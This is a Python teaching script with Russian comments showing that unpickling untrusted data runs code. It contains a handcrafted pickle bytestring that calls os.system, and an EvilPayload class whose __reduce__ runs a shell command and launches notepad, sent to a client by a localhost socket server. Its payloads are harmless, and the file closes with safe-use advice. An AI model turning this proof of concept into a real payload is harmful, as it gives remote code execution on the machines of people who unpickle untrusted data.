
# ---------------------- Примеры работы с модулем pickle ----------------------

# Выдержки из официальной документации, которые говорят о том,
# что модуль является не вполне безопасным решением для передачи объектов по сети.

# ------------------------------------------------------------------------------
# https://docs.python.org/3.6/library/pickle.html
# Warning! The pickle module is not intended to be secure against erroneous 
# or maliciously constructed data. Never unpickle data received 
# from an untrusted or unauthenticated source.

# https://docs.python.org/3.6/library/multiprocessing.html
# Warning
# The Connection.recv() method automatically unpickles the data it receives, 
# which can be a security risk unless you can trust the process which sent the message.
# Therefore, unless the connection object was produced using Pipe() 
# you should only use the recv() and send() methods after performing 
# some sort of authentication. 
# ------------------------------------------------------------------------------

# Модуль pickle служит для сохранения Python-объектов (сериализация/десериализация)
import pickle

# Однако при десериализации не проверяется содержимое внутренностей объекта.
# Строка ниже выполнит системную функцию echo:
pickle.loads(b"cos\nsystem\n(S'echo I am Evil Pickle-module!'\ntR.") 

   
# ------------------------------------------------------------------------------
# А что, если передать pickle-объект по сети? Хорошая идея!

import subprocess
import socket

# Другой вариант - создать свой класс,
# метод __reduce__ которого должен будет осуществлять десериализацию
class EvilPayload:
    """ Функция __reduce__ будет выполнена при распаковке объекта
    """
    def __reduce__(self):
        """ Запустим на машине клиента безобидный Notepad (или другой редактор)
        """
        import os
        os.system("echo You've been hacked by Evil Pickle!!! > evil_msg.txt")

        # with open('evil_msg.txt', 'w') as f:
        #     f.write("You've been hacked by Evil Pickle!!!")

        return (subprocess.Popen, (('notepad','evil_msg.txt'),))
 

# Реализуем простой сокет-сервер для демонстрации примера.
# Клиентское приложение находится в файле evil_pickle_client.py
def evil_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(("localhost", 9999)) 
    print('Зловещий сервер запущен...')
    sock.listen()
    conn, addr = sock.accept()
    print('К нам попался клиент', addr)

    print('Отправляем ему "троянца"...')
    # Отсылаем опасный объект "доверчивому" клиенту
    conn.send(pickle.dumps(EvilPayload()))

evil_server()


# Некоторые рекомендации по безопасному использованию модуля pickle
# 1. По возможности, шифруйте сетевой трафик (SSL/TLS).
# 2. Если шифрование невозможно, пользуйтесь электронной подписью для подтверждения данных.
# 3. Если pickle-данные сохраняются на диск, убедитесь, что только доверенные процессы могут менять эти данные. 
# 4. По возможности, ибегайте модуля pickle. Воспользуйтесь, например, JSON.
